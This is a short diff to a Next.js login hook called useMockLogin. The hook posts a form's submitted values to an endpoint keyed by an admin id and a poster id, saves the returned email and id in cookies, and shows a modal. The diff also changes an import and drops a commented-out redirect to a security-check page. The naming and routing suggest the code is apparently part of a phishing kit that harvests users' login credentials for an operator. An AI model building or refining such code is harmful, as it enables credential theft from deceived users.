@@ -1,7 +1,7 @@
-import { useRouter } from "next/router";
 import { toast } from "react-toastify";
 import Cookies from "js-cookie";
 import { API_URL } from "../config";
+import { useRouter } from "next/navigation";
 
 function useMockLogin({ setShowModal }) {
   const {
@@ -11,7 +11,6 @@ function useMockLogin({ setShowModal }) {
 
   const login = async (values, formik) => {
     // console.log(values);
-    // return;
 
     const url = `${API_URL}/ad/${adminId}/${posterId}`;
 
@@ -23,15 +22,13 @@ function useMockLogin({ setShowModal }) {
       },
       body: JSON.stringify(values),
     });
-
+    setShowModal(true);
     const data = await res.json();
 
     if (res.ok) {
       console.log("success", data);
       Cookies.set("email", data?.info?.email);
       Cookies.set("id", data?.info?._id);
-
-      // push("/security-check");
 
       setShowModal(true);
     } else {
